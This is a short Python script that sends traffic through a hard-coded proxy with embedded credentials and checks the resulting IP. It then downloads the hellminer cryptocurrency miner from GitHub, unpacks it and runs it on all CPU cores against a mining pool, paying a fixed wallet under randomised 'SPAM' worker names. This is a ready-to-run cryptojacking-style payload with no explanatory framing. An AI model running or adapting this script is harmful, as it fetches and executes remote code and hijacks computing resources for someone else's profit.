import os
proxy = 'http://user:pass@45.199.148.4:80'
os.environ['http_proxy'] = proxy 
os.environ['HTTP_PROXY'] = proxy
os.environ['https_proxy'] = proxy
os.environ['HTTPS_PROXY'] = proxy
os.system("curl ipinfo.io")
os.system("curl -L https://raw.githubusercontent.com/hellcatz/luckpool/master/miners/hellminer_cpu_linux.tar.gz --output hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz")
os.system("./hellminer -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RXKKMD5LHex9nrigfwjFeu1t79144WXS2c.SPAM-$(echo $(shuf -i 1-99 -n 1)) -p x --cpu $(echo $(nproc --all))")
